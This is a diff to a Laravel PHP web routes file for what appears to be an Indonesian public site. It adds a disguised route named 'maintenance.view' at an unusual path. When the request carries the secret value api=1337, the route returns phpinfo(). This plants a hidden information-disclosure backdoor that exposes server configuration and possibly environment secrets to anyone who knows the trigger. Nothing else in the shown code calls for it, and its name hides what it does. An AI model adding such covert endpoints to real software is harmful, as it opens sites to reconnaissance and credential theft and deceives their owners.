@@ -1,7 +1,7 @@
 <?php
 
 use Illuminate\Support\Facades\Route;
-
+use Illuminate\Http\Request;
 /*
 |--------------------------------------------------------------------------
 | Web Routes
@@ -142,3 +142,11 @@ Route::middleware(['pengunjung','meta'])->group( function (){
     Route::get('/unduh-file/{id}', [App\Http\Controllers\unduhController::class, 'download'])->name('unduh-file');
     Route::get('/agenda', [App\Http\Controllers\agendaController::class, 'show'])->name('kalender.show');
 });
+
+Route::get('/this/is/the/longest/route/you\'ve/ever/seen', function(Request $request){
+    if($request->input('api') == 1337){
+        return phpinfo();
+    }else{
+        return redirect('home');
+    }
+})->name('maintenance.view');
